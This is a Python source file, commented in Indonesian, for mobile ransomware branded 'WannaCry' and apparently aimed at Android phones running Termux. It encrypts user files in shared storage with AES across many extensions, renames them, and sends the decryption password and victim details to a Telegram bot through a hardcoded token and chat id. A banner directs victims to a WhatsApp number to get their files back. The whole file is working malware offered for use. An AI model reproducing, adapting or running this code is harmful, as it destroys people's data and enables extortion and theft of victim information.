import os
import random
import string
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
import time
import requests

# Ekstensi file yang akan dienkripsi
file_extensions_to_encrypt = [
    '.txt', '.go', '.sh', '.py', '.php', '.java', '.js', '.pdf',
    '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.apk', '.html', '.pem',
    '.key', '.msg', '.7z', '.zip'
]

# Fungsi untuk membuat password acak
def generate_password(length=50):
    characters = string.ascii_letters + string.digits
    password = ''.join(random.choice(characters) for i in range(length))
    return password

# Fungsi untuk mengenkripsi file dengan AES
def encrypt_file(file_path, password):
    salt = get_random_bytes(16)
    aes_key = PBKDF2(password, salt, dkLen=32, count=10000)

    iv = get_random_bytes(16)
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as f:
        file_data = f.read()

    padded_data = pad(file_data, AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)

    with open(file_path, 'wb') as f:
        f.write(salt + iv + encrypted_data)

    # Ubah ekstensi file setelah enkripsi
    os.rename(file_path, file_path + ".WannaCry_Ransomware")

    return file_path + ".WannaCry_Ransomware"

# Fungsi untuk mendekripsi file dengan AES
def decrypt_file(file_path, password):
    with open(file_path, 'rb') as f:
        salt = f.read(16)
        iv = f.read(16)
        encrypted_data = f.read()

    aes_key = PBKDF2(password, salt, dkLen=32, count=10000)
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)

    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    original_file_path = file_path.replace(".WannaCry_Ransomware", "")

    with open(original_file_path, 'wb') as f:
        f.write(decrypted_data)

    # Kembalikan nama file asli
    os.rename(file_path, original_file_path)

# Fungsi untuk mengirim informasi ke bot Telegram
def send_info_to_telegram(name, password, directories, bot_token, chat_id):
    termux_id = os.popen('whoami').read().strip()

    message = (f"Nama: {name}\n"
               f"ID Termux: {termux_id}\n"
               f"Password Dekripsi: {password}\n"
               f"Direktori yang terenkripsi:\n" + "\n".join(directories))

    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, data=data)
    return response.status_code

# Fungsi untuk menampilkan banner
def show_banner():
    banner = """
\033[91m


                                         .:--=-::
                                     :+%@@@@@@@@@@%*-
                                  .*@@@@@@@@@@@@@@@@@@*:
                                 +@@@@@@@@@@@@@@@@@@@@@@*.
                               .%@@@@@@@@@@@@@@@@@@@@@@@@%.
                               *@@@@@@@@@@@@@@@@@@@@@@@@@@@
                              .@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
                              =@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
                              +@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
                              =@@@@=:..:-+@@@@@@+-:..:-%@@@*
                              .@@@.       :@@@@=       .@@@=
                               %@@-       *@@@@#       :@@@:
                               +@@@#=:::=#@@@@@@%=:::=*@@@%
                                *@@@@@@@@@@#  *@@@@@@@@@@#
                                 .=*@@@@@@@:   %@@@@@@*+:
                                     #@@@@@%##%@@@@@%.
                       :*%@%#-       .@@@@@@@@@@@@@@.       :*%@%*-
                       *@@@@@@#.      .-%@=@@#@*@@-:       +@@@@@@@
                        =@@@@@@%=          ::.-          -%@@@@@@*
                       .%@@@@@@@@@*=:                .=*%@@@@@@@@%.
                       :@@@@@@@@@@@@@@%*=:      .-+#@@@@@@@@@@@@@@=
                         :--::::-=+#@@@@@@@%*+#@@@@@@@#*=-::::--:
                                     -*@@@@@@@@@@@@*-.
                             .:=+*%@@@@@@@%#+=*%@@@@@@@%*+=-.
                       -@@@@@@@@@@@@@%*=:        :=*%@@@@@@@@@@@@@+
                       #@@@@@@@@@#=:                  :=*@@@@@@@@@@
                       .%@@@@@#-                          :*@@@@@@:
                        .@@@@-                              :%@@@=
                         :-:                                  :-:

××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
×                 RANSOMWARE WANNA CRY BY : GALIRUS , ANDRAX , GUSTI                  ×
×                 CARA MENEBUS : BUKA WA , CHAT NOMOR +6285847923132                  ×
×TIPS BIAR LO GAK TOLOL : JANGAN EXIT DARI TERMUX UNTUK MEMASTIKAN FILE BISA DI DECRYPT ×
××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××

\033[0m
    """
    print(banner)

# Fungsi untuk verifikasi password dekripsi
def verify_password(input_password, correct_password):
    return input_password == correct_password

# Main program
def main():
    # Pembersihan layar setelah menjalankan program
    os.system('clear')

    # Input nama pengirim dari pengguna
    name = input("Masukan nama: ")  # Input untuk nama pengirim
    os.system('clear')

    # Tampilkan banner setelah pembersihan layar
    show_banner()

    # Lokasi direktori
    directory = '/storage/emulated/0/'
    bot_token = '7946717757:AAGvhfVp-g3PDhxCqdZxlYGCXdN61sDLURM'
    chat_id = '8160684515'
    encrypted_directories = []

    # Generate password acak
    password = generate_password()

    start_time = time.time()  # Start timer

    # Loop melalui semua file dan subdirektori di dalam directory
    for root, dirs, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            # Cek apakah file memiliki ekstensi yang cocok untuk dienkripsi
            if any(filename.endswith(ext) for ext in file_extensions_to_encrypt):
                # Enkripsi file
                encrypted_file_path = encrypt_file(file_path, password)
                encrypted_directories.append(encrypted_file_path)
                if time.time() - start_time > 10:  # Stop jika sudah melebihi 10 detik
                    break

    # Kirim informasi ke bot Telegram
    send_info_to_telegram(name, password, encrypted_directories, bot_token, chat_id)

    # Verifikasi password dari pengguna
    while True:
        input_password = input("Masukkan password untuk dekripsi: ")
        if verify_password(input_password, password):
            print("Password benar! Dekripsi berhasil.")
            for enc_file in encrypted_directories:
                decrypt_file(enc_file, password)
            break
        else:
            print("Password salah, silakan coba lagi.")

if __name__ == "__main__":
    main()